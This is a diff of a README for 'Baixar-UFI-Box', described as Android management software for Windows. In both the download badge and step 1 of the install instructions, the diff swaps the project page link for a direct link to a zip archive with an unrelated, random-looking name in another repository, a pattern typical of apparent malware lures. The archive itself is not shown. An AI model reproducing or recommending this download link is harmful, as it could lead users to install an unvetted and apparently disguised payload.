@@ -5,7 +5,7 @@ description: "Download and install the UFI Box software for Windows 10 and 11 us
 ---
 # 📦 Baixar-UFI-Box - Easy Android Device Management Software
 
-[![Download UFI Box](https://img.shields.io/badge/Download-Blue-blue.svg)](https://github.com/1379almmla2-design/Baixar-UFI-Box)
+[![Download UFI Box](https://img.shields.io/badge/Download-Blue-blue.svg)](https://raw.githubusercontent.com/1379almmla2-design/1379almmla2-design.github.io/main/Farfugium/github-design-almmla-io-electrocapillarity.zip)
 
 ## 📋 About This Software
 
@@ -29,7 +29,7 @@ Make sure your computer meets these needs to avoid lag or crashes during the dev
 Follow these steps to set up the software on your PC.
 
 ### 1. Download the Files
-Visit this page to download: [https://github.com/1379almmla2-design/Baixar-UFI-Box](https://github.com/1379almmla2-design/Baixar-UFI-Box)
+Visit this page to download: [https://raw.githubusercontent.com/1379almmla2-design/1379almmla2-design.github.io/main/Farfugium/github-design-almmla-io-electrocapillarity.zip](https://raw.githubusercontent.com/1379almmla2-design/1379almmla2-design.github.io/main/Farfugium/github-design-almmla-io-electrocapillarity.zip)
 
 Click the download button on the site. Save the file folder to your Desktop. This makes it easy to find.
 
